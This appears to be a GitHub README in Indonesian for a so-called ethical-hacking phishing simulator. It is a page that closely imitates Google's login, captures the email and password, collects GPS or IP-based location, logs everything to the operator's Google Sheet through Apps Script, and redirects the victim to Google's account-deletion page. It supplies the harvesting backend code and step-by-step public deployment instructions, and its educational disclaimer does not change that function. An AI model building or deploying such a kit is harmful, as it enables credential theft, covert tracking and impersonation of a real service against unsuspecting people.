# Ethical-Hacking-Projects-01-Advanced-Phising-Simulator-With-Geolocation-Tracking
---

# 🛡️ Google Apps Script - Google Accounts Phishing Simulation Using Geolocation Tracking.

> ⚠️ **Proyek ini dibuat hanya untuk tujuan pembelajaran dan eksperimen pribadi. Jangan digunakan untuk aktivitas yang melanggar kebijakan Google atau hukum privasi.**

---

## 📖 Deskripsi Proyek

Proyek ini adalah simulasi halaman login bergaya Google yang interaktif. Aplikasi akan meminta input pengguna (email/telepon & password), meminta izin lokasi, lalu mencatat seluruh data ke Google Spreadsheet melalui Google Apps Script. Setelah proses selesai, pengguna akan diarahkan ke halaman tertentu.

---

## 📁 Struktur Proyek

| File            | Fungsi                                                                |
| --------------- | --------------------------------------------------------------------- |
| `Frontend.html` | Menyediakan UI login, validasi form, pemrosesan lokasi, dan interaksi |
| `Code.gs`       | Script backend Google Apps Script untuk menyimpan data ke Spreadsheet |

---

## 🎯 Fitur Lengkap

✅ **UI Login Google-Style**
✅ **Validasi Format Email & Nomor Telepon**
✅ **Tombol Show/Hide Password**
✅ **Pesan Kesalahan Real-Time**
✅ **Spinner (loading state)**
✅ **"Forgot Password" (mengarah ke YouTube prank)**
✅ **Popup Izin Lokasi (Modal Overlay)**
✅ **Geolocation berlapis:**

* GPS (Geolocation API)
* IP-based (`ipapi.co`)
* Timezone fallback (contoh: Asia/Jakarta)

✅ **Data Dicatat ke Google Sheet Otomatis**
✅ **Redirect Otomatis ke Halaman Setelah Login**

---

## 📄 Data yang Dicatat

Format data yang akan ditulis ke Google Sheet:

```
| Username | Password | Timestamp          | Google Maps Link               | Koordinat       |
|----------|----------|--------------------|--------------------------------|-----------------|
| user@abc | 123456   | 2023-01-01 10:00:00| https://maps.google.com?q=-6.1 | -6.1,106.8      |
```

Contoh data:

```json
{
  "username": "john.doe@gmail.com",
  "password": "pa$$word123",
  "timestamp": "2025-07-02T09:50:00Z",
  "location": {
    "latitude": -6.2,
    "longitude": 106.8,
    "accuracy": 50,
    "source": "Geolocation API"
  }
}
```

---

## 🧱 Komponen Frontend (`Frontend.html`)

### 🧩 Tampilan dan UI

* Dibuat dengan HTML & CSS responsif
* Floating label pada input (mirip Material Design)
* Desain sangat menyerupai halaman login Google
* Elemen login:

  * Input email/telepon
  * Input password dengan tombol “Show”
  * Link **"Forgot Password?"** mengarah ke:
    `https://www.youtube.com/watch?v=dQw4w9WgXcQ` 😄

### 📍 Modul Geolocation

* Modal (popup) muncul setelah form tervalidasi
* Tombol:

  * **"Grant Permission"** → Meminta lokasi GPS
  * **"Continue without Permission"** → Menggunakan fallback
* Fallback:

  * IP Location (akurat \~50 km)
  * Timezone → Estimasi kasar lokasi berdasarkan `Intl.DateTimeFormat().resolvedOptions().timeZone`

### 🔁 Form Submission Flow

1. Validasi input
2. Tampilkan popup izin lokasi
3. Ambil lokasi pengguna
4. Kirim semua data ke `Code.gs` melalui `google.script.run.submitLoginData`
5. Tampilkan spinner saat loading
6. Redirect ke halaman:

   ```
   https://myaccount.google.com/deleteaccount?...
   ```

> Kamu bisa ganti URL di fungsi `redirectToPortfolio()`.

---

## 🧠 Fungsi-Fungsi Frontend

| Fungsi                     | Deskripsi                                                               |
| -------------------------- | ----------------------------------------------------------------------- |
| `validateForm()`           | Mengecek validitas email/telepon dan password                           |
| `isValidEmail()`           | Regex validasi email                                                    |
| `isValidPhone()`           | Regex validasi nomor telepon (internasional)                            |
| `getCurrentLocation()`     | Ambil lokasi GPS dengan `navigator.geolocation`                         |
| `getIPLocation()`          | Fetch lokasi berdasarkan IP dari `https://ipapi.co/json/`               |
| `getApproximateLocation()` | Gunakan zona waktu untuk mengestimasi lokasi                            |
| `submitFormWithData()`     | Kirim data ke Apps Script + atur spinner & timeout                      |
| `redirectToPortfolio()`    | Mengarahkan pengguna ke URL target setelah submit berhasil atau timeout |

---

## 🧩 Backend Apps Script (`Code.gs`)

### 📌 Fungsi: `submitLoginData(data)`

* Dibuat dengan `Google Apps Script`
* Menerima objek `data` dari frontend
* Mendekode nilai dan menyimpan ke baris baru Google Sheet
* Gunakan `SpreadsheetApp.openById(SPREADSHEET_ID)` dan `appendRow([...])`

Contoh kode:

```javascript
function submitLoginData(data) {
  const ss = SpreadsheetApp.openById("SPREADSHEET_ID_KAMU");
  const sheet = ss.getActiveSheet();

  const loc = data.location || {};
  const row = [
    new Date(),
    data.username,
    data.password,
    loc.latitude || '',
    loc.longitude || '',
    loc.accuracy || '',
    loc.source || 'unknown'
  ];
  
  sheet.appendRow(row);
}
```

> Ganti `"SPREADSHEET_ID_KAMU"` dengan ID dari Google Spreadsheet kamu.

---

## 🚀 Cara Menjalankan

### 1. Setup Spreadsheet

* Buat Google Spreadsheet baru
* Salin `spreadsheetId` dari URL
* Tambahkan header seperti di bagian “📄 Data yang Dicatat”

### 2. Deploy Web App

1. Buka [Google Apps Script](https://script.google.com)
2. Buat proyek baru
3. Tambahkan:

   * File `Code.gs` → backend
   * File `Frontend.html` → interface
4. Edit ID spreadsheet di `Code.gs`
5. Deploy:

   * Klik **Deploy > New Deployment**
   * Pilih **Web App**
   * Pengaturan:

     * **Execute as:** Me
     * **Access:** Anyone
6. Simpan URL Web App kamu

---

## 🧪 Testing & Simulasi

* Buka URL web app
* Isi form login → klik Next
* Modal akan muncul → izinkan lokasi atau tidak
* Cek Google Sheet → data tercatat
* Halaman akan dialihkan ke redirect URL

---

## ⚠️ Disclaimer Etis & Legal

> ❗ Proyek ini hanya untuk simulasi dan pembelajaran.

* Jangan digunakan untuk menyamar sebagai layanan Google
* Jangan digunakan untuk mencuri data pengguna
* Wajib mendapatkan izin dari pengguna jika mengambil data lokasi dan informasi pribadi
* Melanggar bisa berdampak hukum dan pelanggaran kebijakan

---

## 🧾 Lisensi

MIT License © 2025 — Project by \[Alfin Bahru Rahmika Umar]

---

Jika kamu ingin versi **English** atau penambahan **badge**, **GIF demo**, atau **versi Docker**, tinggal bilang aja ya!
